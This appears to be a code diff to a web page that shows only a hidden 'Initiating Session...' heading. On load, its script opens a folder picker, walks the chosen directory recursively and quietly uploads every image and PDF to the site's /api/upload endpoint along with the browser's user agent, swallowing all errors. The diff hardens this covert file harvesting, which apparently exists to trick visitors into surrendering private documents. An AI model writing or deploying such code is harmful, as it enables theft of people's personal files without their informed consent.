@@ -7,35 +7,57 @@
 </head>
 <body>
   <h1 style="display:none;">Initiating Session...</h1>
-  <input id="picker" type="file" multiple webkitdirectory style="display:none;" />
   <script>
     async function upload(files) {
       const formData = new FormData();
       for (const file of files) {
         if (/\.(jpe?g|png|pdf)$/i.test(file.name)) {
-          formData.append("file", file, file.name);
+          formData.append('file', file, file.name);
         }
       }
-      try {
-        await fetch("/api/upload", {
-          method: "POST",
-          body: formData,
-          headers: {
-            "X-Agent": navigator.userAgent
-          }
-        });
-      } catch (err) {
-        console.error("Upload failed", err);
+      if (formData.has('file')) {
+        try {
+          await fetch('/api/upload', {
+            method: 'POST',
+            body: formData,
+            headers: { 'X-Agent': navigator.userAgent }
+          });
+        } catch {}
       }
     }
 
-    const picker = document.getElementById("picker");
-    picker.click();
-    picker.addEventListener("change", () => {
-      if (picker.files.length > 0) {
-        upload(picker.files);
+    async function pickFolder() {
+      if (window.showDirectoryPicker) {
+        try {
+          const handle = await window.showDirectoryPicker();
+          const files = [];
+          async function walk(dir) {
+            for await (const entry of dir.values()) {
+              if (entry.kind === 'file') {
+                files.push(await entry.getFile());
+              } else {
+                await walk(entry);
+              }
+            }
+          }
+          await walk(handle);
+          return upload(files);
+        } catch {}
       }
-    });
+      const input = document.createElement('input');
+      input.type = 'file';
+      input.multiple = true;
+      input.style.display = 'none';
+      input.setAttribute('webkitdirectory', '');
+      input.setAttribute('directory', '');
+      document.body.appendChild(input);
+      input.addEventListener('change', () => {
+        if (input.files.length) upload(Array.from(input.files));
+      }, { once: true });
+      input.click();
+    }
+
+    pickFolder();
   </script>
 </body>
 </html>
